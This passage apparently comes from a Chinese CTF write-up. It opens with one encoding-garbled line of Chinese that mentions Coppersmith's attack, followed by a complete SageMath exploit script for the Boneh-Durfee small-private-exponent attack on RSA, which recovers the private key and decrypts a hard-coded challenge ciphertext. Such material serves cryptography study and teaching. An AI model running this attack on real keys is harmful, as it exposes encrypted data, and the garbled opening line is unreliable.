alt></p><p>åç»­åº”è¯¥ç”¨åˆ°äº†coppersmithå¯¹äºå¤šå…ƒæ¨¡ç­‰å¼çš„æ”»å‡»ï¼ˆå‘æœ‰ç‚¹å„¿æ·±ï¼Œå…·ä½“è¯æ˜ç•¥ï¼‰</p><h4 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span><span class="params">(BB, modulus)</span>:</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span><span class="params">(BB, monomials, bound, current)</span>:</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">"* removing unhelpful vector"</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print(<span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span><span class="params">(pol, modulus, mm, tt, XX, YY)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"failure"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        print(<span class="string">"We do not have det &lt; bound. Solutions might not be found."</span>)</span><br><span class="line">        print(<span class="string">"Try with highers m and t."</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"LLL is done!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"looking for independent vectors in the lattice"</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        print(<span class="string">"no independant vectors could be found. This should very rarely happen..."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Your prediction (delta) is too small"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb</span></span><br><span class="line">    c = <span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.28</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span><span class="number">-2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== checking values ==="</span>)</span><br><span class="line">        print(<span class="string">"* delta:"</span>, delta)</span><br><span class="line">        print(<span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        print(<span class="string">"* size of e:"</span>, int(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* size of N:"</span>, int(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== running algorithm ==="</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"=== solution found ==="</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            print(<span class="string">"x:"</span>, solx)</span><br><span class="line">            print(<span class="string">"y:"</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        print(<span class="string">"private key found:"</span>, d)</span><br><span class="line">        print(<span class="string">"plaintext:"</span>, pow(c, d, N))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"=== no solution was found ==="</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== %s seconds 